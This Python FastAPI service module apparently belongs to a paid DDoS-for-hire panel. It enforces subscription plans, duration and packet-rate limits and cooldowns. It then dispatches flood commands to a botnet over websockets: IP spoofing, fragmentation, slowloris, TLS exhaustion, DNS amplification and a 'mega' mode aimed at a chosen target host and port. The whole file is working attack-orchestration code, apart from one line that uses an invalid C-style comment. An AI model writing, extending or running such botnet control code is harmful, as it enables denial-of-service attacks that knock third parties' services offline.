from datetime import datetime, timezone, timedelta
from typing import Optional, List
from uuid import UUID
from fastapi import HTTPException
from sqlalchemy import select, and_
from app.database import async_session
from app.models.all_models import AttackTask, Bot, User, Plan, UserSubscription
from app.schemas.all_schemas import AttackCreate
from app.services.bot_service import BotService
from app.websocket.bot_handler import manager

class AttackService:
    @staticmethod
    async def launch(user: User, data: AttackCreate) -> AttackTask:
        is_admin = (user.role or "") == "admin"
        async with async_session() as s:
            plan = None
            max_concurrent = 10
            max_secs = 3600
            max_pps = 100_000_000  /* admin: no limit */
            allowed = None
            cooldown = 0

            if not is_admin:
                sub_r = await s.execute(select(UserSubscription).where(and_(
                    UserSubscription.user_id == user.id,
                    UserSubscription.status == "active",
                )))
                sub = sub_r.scalar_one_or_none()
                if not sub:
                    raise HTTPException(403, "No active subscription. Buy a plan first.")
                if sub.expires_at and sub.expires_at < datetime.now(timezone.utc):
                    raise HTTPException(403, "Subscription expired.")

                plan_r = await s.execute(select(Plan).where(Plan.id == sub.plan_id))
                plan = plan_r.scalar_one_or_none()
                if not plan:
                    raise HTTPException(400, "Plan not found")

                max_concurrent = plan.max_concurrent
                max_secs = plan.max_attack_secs
                max_pps = plan.max_pps_per_bot
                allowed = list(plan.allowed_methods or [])
                cooldown = plan.cooldown_secs or 0

                if data.duration_secs > max_secs:
                    raise HTTPException(400, f"Duration exceeds plan limit ({max_secs}s)")
                if data.pps_per_bot > max_pps:
                    raise HTTPException(400, f"PPS exceeds plan limit ({max_pps})")
                if allowed and data.method not in allowed:
                    raise HTTPException(400, f"Method '{data.method}' not allowed in plan")

                recent = (await s.execute(
                    select(AttackTask).where(AttackTask.user_id == user.id)
                    .order_by(AttackTask.created_at.desc()).limit(1)
                )).scalar_one_or_none()
                if recent and recent.completed_at and cooldown:
                    cd_end = recent.completed_at + timedelta(seconds=cooldown)
                    if cd_end > datetime.now(timezone.utc):
                        left = int((cd_end - datetime.now(timezone.utc)).total_seconds())
                        raise HTTPException(429, f"Cooldown: {left}s remaining")

                active_n = (await s.execute(select(AttackTask).where(
                    AttackTask.user_id == user.id, AttackTask.status == "running"
                ))).scalars().all()
                if len(list(active_n)) >= (plan.max_concurrent if plan else 1):
                    raise HTTPException(429, "Max concurrent attacks reached for your plan")

            available = await BotService.get_available_bots(
                data.bot_count if data.bot_count > 1 else max_concurrent, [data.method],
                user_id=None if is_admin else user.id,
            )
            # Admin can use any online bot
            if is_admin and not available:
                async with async_session() as s2:
                    r = await s2.execute(
                        select(Bot).where(Bot.status == "online").limit(max_concurrent)
                    )
                    available = list(r.scalars().all())

            if not available:
                raise HTTPException(503, "No bots available / online")

            bot_ids = [b.id for b in available]
            task = AttackTask(
                user_id=user.id,
                target_host=data.target_host,
                target_port=data.target_port,
                method=data.method,
                duration_secs=data.duration_secs,
                pps_per_bot=data.pps_per_bot,
                spoof_mode=data.spoof_mode,
                fragmentation=data.fragmentation,
                slowloris=data.slowloris,
                tls_exhaust=data.tls_exhaust,
                dns_amp=data.dns_amp,
                game_mimic=data.game_mimic,
                mega_mode=data.mega_mode,
                status="pending",
                bot_ids=bot_ids,
                started_at=datetime.now(timezone.utc),
            )
            s.add(task)
            await s.commit()
            await s.refresh(task)

            method = data.method.upper()
            delivered = 0
            for bot in available:
                try:
                    await manager.send_attack_command(str(bot.id), {
                        "id": str(task.id),
                        "target": data.target_host,
                        "port": data.target_port,
                        "method": method,
                        "duration": data.duration_secs,
                        "pps": data.pps_per_bot,
                        "threads": bot.max_threads or 100,
                        "spoof_mode": data.spoof_mode,
                        "fragmentation": int(data.fragmentation),
                        "slowloris": int(data.slowloris or method == "SLOWLORIS"),
                        "tls_exhaust": int(data.tls_exhaust or method == "TLS_EXHAUST"),
                        "dns_amp": int(data.dns_amp or method == "DNS_AMP"),
                        "mega_mode": int(data.mega_mode or method == "MEGA"),
                    })
                    delivered += 1
                except Exception as e:
                    print(f"[atk] failed to send to bot {bot.id}: {e}")

            if delivered == 0:
                task.status = "failed"
                await s.commit()
                raise HTTPException(503, "No bots could be reached to deliver command")

            task.status = "running"
            await s.commit()
            return task

    @staticmethod
    async def stop(task_id: UUID, user: User):
        async with async_session() as s:
            task = (await s.execute(
                select(AttackTask).where(AttackTask.id == task_id, AttackTask.status == "running")
            )).scalar_one_or_none()
            if not task:
                raise HTTPException(404, "Task not running")
            if user.role != "admin" and task.user_id != user.id:
                raise HTTPException(403, "Not your attack")
            task.status = "completed"
            task.completed_at = datetime.now(timezone.utc)
            await s.commit()
            for bid in (task.bot_ids or []):
                try:
                    await manager.send_stop_command(str(bid), str(task_id))
                except Exception:
                    pass

    @staticmethod
    async def get_user_tasks(user_id: UUID) -> List[AttackTask]:
        async with async_session() as s:
            r = await s.execute(
                select(AttackTask).where(AttackTask.user_id == user_id)
                .order_by(AttackTask.created_at.desc()).limit(100)
            )
            return list(r.scalars().all())

    @staticmethod
    async def get_active_tasks(user_id: Optional[UUID] = None) -> List[AttackTask]:
        async with async_session() as s:
            conds = [AttackTask.status == "running"]
            if user_id:
                conds.append(AttackTask.user_id == user_id)
            r = await s.execute(select(AttackTask).where(and_(*conds)))
            return list(r.scalars().all())
